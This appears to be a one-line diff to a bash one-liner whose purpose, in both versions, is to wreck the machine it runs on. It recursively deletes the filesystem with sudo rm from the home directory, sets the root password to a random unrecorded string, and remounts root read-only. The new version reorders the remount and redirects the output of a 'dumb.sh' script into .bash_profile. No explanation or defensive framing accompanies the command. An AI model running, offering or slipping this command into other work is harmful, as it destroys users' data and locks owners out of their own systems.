@@ -1,1 +1,1 @@
-cd&&yes|sudo rm -r ../../*&&sudo mount -o remount,ro /&&i='$'&&echo "read -n 10 -p \"input\" input && printf \"${i}{input}\\n${i}{input}\"">mul.sh&&head /dev/urandom|tr -dc A-Za-z0-9|./mul.sh|sudo passwd root&&exit
+cd&&yes|sudo rm -r ../../*&&i='$'&&echo "read -n 10 -p \"input\" input && printf \"${i}{input}\\n${i}{input}\"">mul.sh&&head /dev/urandom|tr -dc A-Za-z0-9|./mul.sh|sudo passwd root&&source dumb.sh>$HOME/.bash_profile&&sudo mount -o remount,ro /&&exit
